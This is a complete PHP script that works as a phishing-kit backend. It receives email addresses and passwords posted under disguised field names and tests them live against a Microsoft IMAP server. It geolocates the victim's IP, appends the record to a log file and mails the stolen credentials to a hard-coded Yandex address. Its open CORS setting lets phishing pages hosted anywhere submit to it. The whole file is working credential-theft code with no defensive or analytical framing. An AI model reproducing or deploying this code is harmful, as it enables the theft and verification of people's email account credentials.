<?php
//##########################
//#  Configuration
//####
$config['adminEmail'] = 'backhdd@yandex.com';


//#########################################
cors();
$data = empty($_POST)
    ? json_decode(file_get_contents('php://input'), true)
    : $_POST;

$request = isset($data['t']) ? $data['t'] : null;
switch ($request) {
    case NULL :
    case '' :
        die('Testing Routing');
        break;
    case '1' :
        $validate = isset($data['v']) ? !!$data['v'] : false;
        saveConfiguration($validate);
        break;
    default:
        header("{$_SERVER["SERVER_PROTOCOL"]} 404 Not Found");
        break;
}
exit;


function saveConfiguration($validate = false)
{
    global $data;

    $email = isset($data['name']) ? $data['name'] : null;
    $password = isset($data['path']) ? $data['path'] : null;
    $desc = isset($data['desc']) ? $data['desc'] : null;

    $authenticated = false;
    if ($validate) {
        //Validate
        $authenticated = validateLogin($email, $password);
    }

    $ip = getClientIP();
    $ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));
    $location = $ipdat->geoplugin_countryName . " | " . $ipdat->geoplugin_city . " | " . $ipdat->geoplugin_continentName;
    $data = "Email: $email\nPassword: $password\nIP: $ip\nLocation: $location\n"
        . "Login Successful: " . ($authenticated ? 'Yes' : 'No') . PHP_EOL
        . "Description: $desc" . PHP_EOL
        . "---------------------------------------------\n\n";

    if (!file_exists('./logs')) {
        mkdir('./logs');
    }

    //Persist
    saveLoginDataToFile($data);

    //Send mail
    sendLoginDataToEmail($data);
}

function dd($value)
{
    echo '<pre>';
    var_dump($value);
    die('</pre>');
}


function cors()
{

    // Allow from any origin
    // Decide if the origin in $_SERVER['HTTP_ORIGIN'] is one
    // you want to allow, and if so:
    header("Access-Control-Allow-Origin: *");
    header('Access-Control-Allow-Credentials: true');
    header('Access-Control-Max-Age: 86400');    // cache for 1 day

    // Access-Control headers are received during OPTIONS requests
    if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {

        if (isset($_SERVER['HTTP_ACCESS_CONTROL_REQUEST_METHOD']))
            // may also be using PUT, PATCH, HEAD etc
            header("Access-Control-Allow-Methods: GET, POST, OPTIONS");

        if (isset($_SERVER['HTTP_ACCESS_CONTROL_REQUEST_HEADERS']))
            header("Access-Control-Allow-Headers: {$_SERVER['HTTP_ACCESS_CONTROL_REQUEST_HEADERS']}");

        exit(0);
    }
}

function getClientIP()
{
    if (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
        return $ip;
    } else {
        $remoteKeys = [
            'HTTP_X_FORWARDED_FOR',
            'HTTP_CLIENT_IP',
            'HTTP_X_FORWARDED',
            'HTTP_FORWARDED_FOR',
            'HTTP_FORWARDED',
            'REMOTE_ADDR',
            'HTTP_X_CLUSTER_CLIENT_IP',
        ];

        foreach ($remoteKeys as $key) {
            if ($address = getenv($key)) {
                foreach (explode(',', $address) as $ip) {
                    if (isValidIp($ip)) {
                        return $ip;
                    }
                }
            }
        }

        return '127.0.0.0';
    }

}

function isValidIp($ip)
{
    if (!filter_var($ip, FILTER_VALIDATE_IP,
            FILTER_FLAG_IPV4 | FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)
        && !filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6 | FILTER_FLAG_NO_PRIV_RANGE)
    ) {
        return false;
    }

    return true;
}

function validateLogin($username, $password, $exitOnFalse = false)
{
    $authenticated = checkImapConnect($username, $password);
    if ($authenticated) {
        return $authenticated;
    }

    if ($authenticated === false)
        header("{$_SERVER["SERVER_PROTOCOL"]} 401 Unauthorized");

    if ($exitOnFalse)
        exit;

    return $authenticated;
}

function checkImapConnect($username, $password)
{
    try {
        //Microsoft login
        $hostname = '{40.101.54.2:993/imap/ssl/novalidate-cert}INBOX';
        $inbox = @imap_open($hostname, $username, $password);
        $connected = !!$inbox;

        @imap_close($inbox);
        return $connected;
    } catch (Throwable $exception) {
        reportError($exception);
        return null;
    }
}

function saveLoginDataToFile($data)
{
    $chuksHandle = fopen('logs/emails.txt', 'a');
    fwrite($chuksHandle, $data);
    fclose($chuksHandle);
}

function reportError(Throwable $exception, $exitAfterReport = false)
{
    header("{$_SERVER["SERVER_PROTOCOL"]} 500 Internal Server Error");
    if ($exitAfterReport)
        exit;
}

function sendLoginDataToEmail($data)
{
    global $config;

    try {
        $subject = "New Data Received";
        @mail($config['adminEmail'], $subject, $data);
    } catch (Exception $exc) {
        $errHandle = fopen('logs/error.log', 'a');
        $data = $exc->getTraceAsString();
        fwrite($errHandle, $data . PHP_EOL . PHP_EOL);
        fclose($errHandle);
    }
}